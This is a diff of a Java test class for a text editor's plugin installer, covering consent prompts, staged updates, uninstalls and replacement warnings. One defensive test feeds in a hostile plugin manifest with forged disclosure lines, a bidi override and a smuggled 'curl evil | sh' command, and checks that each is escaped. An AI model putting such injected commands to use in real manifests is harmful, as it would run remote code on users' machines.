@@ -41,6 +41,7 @@ import org.junit.jupiter.api.io.TempDir;
 import static com.editora.i18n.Messages.tr;
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
+import static org.junit.jupiter.api.Assertions.assertNotNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 /**
@@ -316,10 +317,13 @@ class PluginCoordinatorFxTest {
 
             assertEquals(List.of(), first.errors);
             assertEquals(List.of(Question.Kind.ENABLE), first.asked());
-            String disclosure = first.questions.get(0).body();
+            String disclosure = first.questions.get(0).text();
             assertTrue(disclosure.contains("Greeter 1.0"), disclosure);
             assertTrue(disclosure.contains(tr("plugins.cap.code")), "it ships code, and says so: " + disclosure);
-            assertTrue(disclosure.contains("greeter-tool --hello"), "the command it would run is shown: " + disclosure);
+            assertTrue(
+                    disclosure.contains("Greeter: Hello: [\"greeter-tool\", \"--hello\"]"),
+                    "the command it would run is shown, its title and each argument: " + disclosure);
+            assertTrue(disclosure.contains(tr("plugins.cap.mainClass", GreeterPlugin.class.getName())), disclosure);
             assertTrue(first.enabled("greeter"));
             assertEquals(tr("status.plugins.installed", "Greeter"), first.host.last());
             assertTrue(Files.isRegularFile(first.pluginsDir().resolve("greeter/plugin.json")));
@@ -342,16 +346,21 @@ class PluginCoordinatorFxTest {
             second.answers.add(false);
             FxTestSupport.runOnFx(() -> second.coordinator.uninstall("greeter"));
             assertEquals(List.of(Question.Kind.UNINSTALL), second.asked());
-            assertTrue(second.questions.get(0).body().contains("greeter"));
+            assertEquals(
+                    tr("dialog.plugins.uninstallHeader", "Greeter"),
+                    second.questions.get(0).header());
+            assertTrue(second.questions.get(0).text().contains("greeter"), "the folder is named");
             assertTrue(Files.exists(second.pluginsDir().resolve("greeter")), "declined: nothing is removed");
             assertTrue(second.enabled("greeter"));
 
+            // E3: it runs in this session (its jar may be open): switched off now, deleted at the next start.
             FxTestSupport.runOnFx(() -> second.coordinator.uninstall("greeter"));
             assertEquals(List.of(), second.errors);
-            assertFalse(Files.exists(second.pluginsDir().resolve("greeter")), "its folder is deleted");
-            assertFalse(second.enabled("greeter"), "and so is the consent to run it");
-            assertEquals(List.of(), second.installed());
-            assertEquals(tr("status.plugins.uninstalled", "greeter"), second.host.last());
+            assertTrue(Files.exists(second.pluginsDir().resolve(".remove-greeter")), "marked for the next start");
+            assertFalse(second.enabled("greeter"), "the consent to run it is gone at once");
+            assertTrue(FxTestSupport.callOnFx(
+                    () -> second.fx.windowManager.pluginManager().pendingRemoval("greeter")));
+            assertEquals(tr("status.plugins.removalPending", "Greeter"), second.host.last());
         }
         assertEquals(List.of("start", "stop"), PLUGIN_EVENTS, "closing the window stopped the plugin");
 
@@ -359,6 +368,8 @@ class PluginCoordinatorFxTest {
             Rig third = new Rig(scope, configDir);
 
             assertEquals(List.of("start", "stop"), PLUGIN_EVENTS, "nothing of it runs any more");
+            assertFalse(Files.exists(third.pluginsDir().resolve("greeter")), "the start deleted its folder");
+            assertFalse(Files.exists(third.pluginsDir().resolve(".remove-greeter")));
             assertTrue(third.commands().get("plugin.greeter.hello").isEmpty());
             assertTrue(third.commands().get("plugin.greeter.wave").isEmpty());
             assertFalse(third.toolWindowIds().contains("plugin.greeter.panel"));
@@ -366,9 +377,9 @@ class PluginCoordinatorFxTest {
         }
     }
 
-    /** Installing is not consenting: a plugin whose capabilities the user turns down stays switched off. */
+    /** Installing is consenting: an install whose capabilities the user turns down puts nothing on disk (A2). */
     @Test
-    void decliningTheEnableQuestionLeavesThePluginInstalledButOff() throws Exception {
+    void decliningTheEnableQuestionInstallsNothing() throws Exception {
         try (AsyncTestScope scope = new AsyncTestScope()) {
             Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("declined")));
             rig.answers.add(false);
@@ -376,21 +387,31 @@ class PluginCoordinatorFxTest {
             rig.installFromDisk(greeterZip("1.0", false));
 
             assertEquals(List.of(Question.Kind.ENABLE), rig.asked());
-            assertFalse(rig.questions.get(0).body().contains(tr("plugins.cap.code")), "no jar, no code warning");
+            assertFalse(rig.questions.get(0).text().contains(tr("plugins.cap.code")), "no jar, no code warning");
+            assertTrue(rig.questions.get(0).text().contains(tr("plugins.cap.snippets")), "its snippets are named");
             assertFalse(rig.enabled("greeter"));
-            assertEquals(tr("status.plugins.notEnabled", "Greeter"), rig.host.last());
-            assertTrue(Files.isRegularFile(rig.pluginsDir().resolve("greeter/plugin.json")));
-            assertFalse(rig.installed().get(0).enabled());
+            assertEquals(tr("status.plugins.notInstalled", "Greeter"), rig.host.last());
+            assertFalse(Files.exists(rig.pluginsDir().resolve("greeter")));
+            assertEquals(List.of(), rig.installed());
+            assertEquals(List.of(), stagingLeft(rig), "the staged copy is gone too");
+        }
+    }
+
+    private static List<String> stagingLeft(Rig rig) throws Exception {
+        try (var s = Files.list(rig.pluginsDir())) {
+            return s.map(p -> p.getFileName().toString())
+                    .filter(n -> n.startsWith("."))
+                    .toList();
         }
     }
 
     /**
-     * An update replaces the code on disk before the question is asked. Turning the new version's
-     * capabilities down therefore has to switch the plugin off — or the rejected code would run at the next
-     * launch under the consent given to the old one.
+     * An update is staged beside the installed version and shown as "Update Greeter 1.0 → 2.0". Turning the new
+     * version's capabilities down keeps the version that was installed — and enabled (A2; it used to be replaced
+     * first and then switched off).
      */
     @Test
-    void decliningAnUpdatesCapabilitiesSwitchesThePluginOff() throws Exception {
+    void decliningAnUpdateKeepsTheInstalledVersionEnabled() throws Exception {
         try (AsyncTestScope scope = new AsyncTestScope()) {
             Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("update")));
             rig.installFromDisk(greeterZip("1.0", false));
@@ -400,11 +421,131 @@ class PluginCoordinatorFxTest {
             rig.installFromDisk(greeterZip("2.0", true));
 
             assertEquals(List.of(Question.Kind.ENABLE, Question.Kind.ENABLE), rig.asked());
-            String second = rig.questions.get(1).body();
-            assertTrue(second.contains("Greeter 2.0"), "the question describes the new version: " + second);
-            assertTrue(second.contains(tr("plugins.cap.code")), "and what it newly asks for: " + second);
-            assertFalse(rig.enabled("greeter"));
-            assertEquals("2.0", rig.installed().get(0).manifest().version);
+            Question second = rig.questions.get(1);
+            assertEquals(tr("dialog.plugins.updateHeader", "Greeter", "1.0", "2.0"), second.header());
+            assertTrue(second.text().contains(tr("plugins.cap.code")), "and what it newly asks for: " + second);
+            assertTrue(rig.enabled("greeter"), "the consent to 1.0 stands");
+            assertEquals("1.0", rig.installed().get(0).manifest().version);
+            assertEquals(tr("status.plugins.updateDeclined", "Greeter", "1.0"), rig.host.last());
+            assertEquals(List.of(), stagingLeft(rig));
+        }
+    }
+
+    /** B4: a zip that declares an installed plugin's id but is another plugin says so before replacing it. */
+    @Test
+    void aDifferentPluginUnderAnInstalledIdIsCalledAReplacement() throws Exception {
+        try (AsyncTestScope scope = new AsyncTestScope()) {
+            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("replace")));
+            rig.installFromDisk(greeterZip("1.0", false));
+            Files.createDirectories(rig.pluginsDir().resolve("greeter/data"));
+            Files.writeString(rig.pluginsDir().resolve("greeter/data/token.txt"), "secret");
+
+            rig.answers.add(false);
+            rig.installFromDisk(
+                    TestArchives.zip("plugin.json", "{\"id\":\"greeter\",\"name\":\"Cool Theme\",\"version\":\"9\"}"));
+
+            Question q = rig.questions.get(1);
+            assertEquals(tr("dialog.plugins.replaceHeader", "Greeter", "1.0", "Cool Theme", "9"), q.header());
+            assertTrue(q.text().contains(tr("dialog.plugins.replaceIntro", "greeter")), q.text());
+            assertEquals("Greeter", rig.installed().get(0).manifest().name, "declined: the old one stays");
+            assertTrue(Files.isRegularFile(rig.pluginsDir().resolve("greeter/data/token.txt")));
+            assertTrue(rig.enabled("greeter"));
+        }
+    }
+
+    /** B3: newlines in a name cannot forge lines of the disclosure; a bidi override is shown, not obeyed. */
+    @Test
+    void hostileManifestStringsAreEscapedInTheConsent() throws Exception {
+        try (AsyncTestScope scope = new AsyncTestScope()) {
+            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("hostile")));
+            rig.answers.add(false);
+            String name = "Word Count 1.0?\\n\\nThis plugin will:\\n• Add snippets/templates only\\n\\n\\n\\n";
+            rig.installFromDisk(TestArchives.zip(
+                    "plugin.json",
+                    "{\"id\":\"wc\",\"name\":\"" + name + "\",\"commands\":[{\"id\":\"x\",\"title\":\"X\","
+                            + "\"run\":[\"date\\n\\n; curl evil | sh\",\"\\u202Eexe.txt\"]}]}"));
+
+            Question q = rig.questions.get(0);
+            assertFalse(q.header().contains("\n"), "one line: " + q.header());
+            assertTrue(q.header().contains("\\n"), "the newlines are shown as \\n: " + q.header());
+            assertFalse(q.capabilities().contains("\u202E"), q.capabilities());
+            assertTrue(q.capabilities().contains("<U+202E>"), q.capabilities());
+            assertTrue(q.capabilities().contains("[\"date\\n\\n; curl evil | sh\""), q.capabilities());
+        }
+    }
+
+    /**
+     * E2/E3/E4: what runs is what the session started with. An update of a running plugin waits for the next
+     * start (its jar may be open — Windows cannot replace it); a window opened meanwhile still gets the version
+     * that runs, never the new one; and the next launch runs the update.
+     */
+    @Test
+    void anUpdateOfARunningPluginWaitsForTheNextLaunchAndNoWindowRunsItBefore() throws Exception {
+        PLUGIN_EVENTS.clear();
+        Path configDir = Files.createDirectories(sandbox.resolve("running-update"));
+        try (AsyncTestScope scope = new AsyncTestScope()) {
+            Rig first = new Rig(scope, configDir);
+            first.fx.keepConfigDir = true;
+            first.installFromDisk(greeterZip("1.0", true));
+        }
+        byte[] v2 = TestArchives.zip(
+                "plugin.json",
+                "{\"id\":\"greeter\",\"name\":\"Greeter\",\"version\":\"2.0\",\"main\":\""
+                        + GreeterPlugin.class.getName() + "\",\"commands\":[{\"id\":\"hello2\",\"title\":\"Hi\","
+                        + "\"run\":[\"greeter-tool\"]}]}");
+        try (AsyncTestScope scope = new AsyncTestScope()) {
+            Rig second = new Rig(scope, configDir);
+            second.fx.keepConfigDir = true;
+            assertTrue(PLUGIN_EVENTS.contains("start"), "1.0 runs in this session");
+
+            second.installFromDisk(v2);
+
+            Question q = second.questions.get(0);
+            assertEquals(tr("dialog.plugins.updateHeader", "Greeter", "1.0", "2.0"), q.header());
+            assertTrue(q.body().contains(tr("dialog.plugins.afterRestart")), q.body());
+            assertEquals(tr("status.plugins.updatePending", "Greeter", "2.0"), second.host.last());
+            assertTrue(Files.isDirectory(second.pluginsDir().resolve(".pending-greeter")));
+            assertEquals("1.0", second.installed().get(0).manifest().version, "its folder is not touched");
+            com.editora.plugin.PluginManager pm = second.fx.windowManager.pluginManager();
+            assertEquals("2.0", pm.pendingUpdate("greeter"));
+
+            MainController another = FxTestSupport.callOnFx(() -> second.fx.windowManager.buildWindowForTest());
+            CommandRegistry anotherCommands = FxTestSupport.field(another, "registry");
+            assertTrue(anotherCommands.get("plugin.greeter.hello").isPresent(), "a new window runs 1.0");
+            assertTrue(anotherCommands.get("plugin.greeter.hello2").isEmpty(), "never the update before a restart");
+        }
+        try (AsyncTestScope scope = new AsyncTestScope()) {
+            Rig third = new Rig(scope, configDir);
+            assertFalse(Files.exists(third.pluginsDir().resolve(".pending-greeter")), "applied before discovery");
+            assertEquals("2.0", third.installed().get(0).manifest().version);
+            assertTrue(third.enabled("greeter"), "the consent was given to 2.0's capabilities");
+            assertTrue(third.commands().get("plugin.greeter.hello2").isPresent(), "the next launch runs 2.0");
+        }
+    }
+
+    /** E4: switching a running plugin off is a change for the next launch, for every window — as the page says. */
+    @Test
+    void switchingARunningPluginOffChangesWhatTheNextLaunchLoads() throws Exception {
+        PLUGIN_EVENTS.clear();
+        Path configDir = Files.createDirectories(sandbox.resolve("switch-off"));
+        try (AsyncTestScope scope = new AsyncTestScope()) {
+            Rig first = new Rig(scope, configDir);
+            first.fx.keepConfigDir = true;
+            first.installFromDisk(greeterZip("1.0", true));
+        }
+        try (AsyncTestScope scope = new AsyncTestScope()) {
+            Rig second = new Rig(scope, configDir);
+            second.fx.keepConfigDir = true;
+            com.editora.plugin.PluginDescriptor d = second.installed().get(0);
+            FxTestSupport.runOnFx(() -> second.coordinator.disableFromSettings(d));
+            assertFalse(second.enabled("greeter"));
+            assertNotNull(
+                    second.fx.windowManager.pluginManager().running("greeter"),
+                    "still the session's: its windows keep it until the restart the row asks for");
+        }
+        try (AsyncTestScope scope = new AsyncTestScope()) {
+            Rig third = new Rig(scope, configDir);
+            assertTrue(third.commands().get("plugin.greeter.hello").isEmpty(), "off at the next launch");
         }
     }
 
@@ -415,10 +556,8 @@ class PluginCoordinatorFxTest {
 
             rig.installFromDisk(TestArchives.zip("README.md", "hello"));
 
-            assertEquals(
-                    List.of(tr("status.plugins.installFailed", "no plugin.json in archive")
-                            + " | no plugin.json in archive"),
-                    rig.errors);
+            String why = tr("plugins.problem.noManifest");
+            assertEquals(List.of(tr("status.plugins.installFailed", why) + " | " + why), rig.errors);
             assertEquals(List.of(), rig.asked(), "there is nothing to consent to");
             assertEquals(List.of(), rig.installed());
             assertFalse(Files.exists(rig.pluginsDir().resolve("greeter")));
@@ -472,7 +611,7 @@ class PluginCoordinatorFxTest {
             assertEquals(List.of(), rig.errors);
             assertTrue(FxTestSupport.callOnFx(() -> rig.palette().isShown()), "Browse Plugins is open");
             assertEquals(1, rig.listed().size());
-            assertEquals(tr("status.plugins.fetching"), rig.host.last(), "no unsigned-registry warning");
+            assertEquals("", rig.host.last(), "no unsigned-registry warning, and no stale Fetching… (A10)");
 
             rig.browseAgain();
             assertEquals(
@@ -483,8 +622,11 @@ class PluginCoordinatorFxTest {
             rig.choose(rig.listed().get(0));
 
             assertEquals(List.of(Question.Kind.INSTALL, Question.Kind.ENABLE), rig.asked());
+            assertEquals(
+                    tr("dialog.plugins.installHeaderNew", "Greeter", "1.0"),
+                    rig.questions.get(0).header());
             String install = rig.questions.get(0).body();
-            assertTrue(install.contains("Greeter 1.0 (Ada)"), "name, version and author are told apart: " + install);
+            assertTrue(install.contains(tr("dialog.plugins.installAuthor", "Ada")), install);
             assertTrue(install.contains(ZIP_URL), "where it will be downloaded from is shown: " + install);
             assertFalse(install.contains(tr("dialog.plugins.unsignedWarn")), install);
             assertTrue(rig.enabled("greeter"));
@@ -510,6 +652,7 @@ class PluginCoordinatorFxTest {
             rig.web.serve(ZIP_URL, zip);
             SettingsWindow w = FxTestSupport.field(rig.fx.controller, "settingsWindow");
             javafx.stage.Stage stage = FxTestSupport.field(w, "stage");
+            rig.settings().setPluginRegistryUrl(INDEX_URL); // before Settings shows it (its field commits on blur)
             FxTestSupport.runOnFx(() -> w.show(FxTestSupport.field(rig.fx.controller, "stage")));
 
             rig.browse(index(zip, ""), false); // refused: unsigned
@@ -519,6 +662,19 @@ class PluginCoordinatorFxTest {
             rig.browseAgain();
             assertTrue(FxTestSupport.callOnFx(() -> rig.palette().isShown()));
             assertFalse(FxTestSupport.callOnFx(stage::isShowing), "out of the picker's way");
+
+            // A4: Esc in the picker brings Settings back, where the user started.
+            FxTestSupport.runOnFx(() -> rig.palette().hide());
+            FxTestSupport.drainFx();
+            assertTrue(FxTestSupport.callOnFx(stage::isShowing), "Settings is back once the picker closes");
+
+            // And after an install chosen from the picker, once its questions are answered.
+            rig.browseAgain();
+            assertFalse(FxTestSupport.callOnFx(stage::isShowing));
+            rig.choose(rig.listed().get(0));
+            assertTrue(rig.enabled("greeter"));
+            assertTrue(FxTestSupport.callOnFx(stage::isShowing), "back on the Plugins page with the new row");
+            FxTestSupport.runOnFx(stage::hide);
         }
     }
 
@@ -599,9 +755,8 @@ class PluginCoordinatorFxTest {
             rig.choose(rig.listed().get(0));
 
             assertEquals(List.of(Question.Kind.INSTALL), rig.asked(), "never reaches the enable question");
-            assertEquals(
-                    List.of(tr("status.plugins.installFailed", "checksum mismatch") + " | checksum mismatch"),
-                    rig.errors);
+            String why = tr("plugins.problem.checksum");
+            assertEquals(List.of(tr("status.plugins.installFailed", why) + " | " + why), rig.errors);
             assertFalse(rig.enabled("greeter"));
             assertEquals(List.of(), rig.installed());
             assertFalse(Files.exists(rig.pluginsDir().resolve("greeter")));
@@ -632,7 +787,7 @@ class PluginCoordinatorFxTest {
 
             rig.browseAgain(); // nothing is served: 404
 
-            assertEquals(tr("status.plugins.fetchFailed", "HTTP 404"), rig.host.last());
+            assertEquals(tr("status.plugins.fetchFailed", tr("plugins.problem.httpStatus", "404")), rig.host.last());
             assertFalse(FxTestSupport.callOnFx(() -> rig.palette().isShown()));
 
             rig.browse("{\"plugins\":[]}", true);
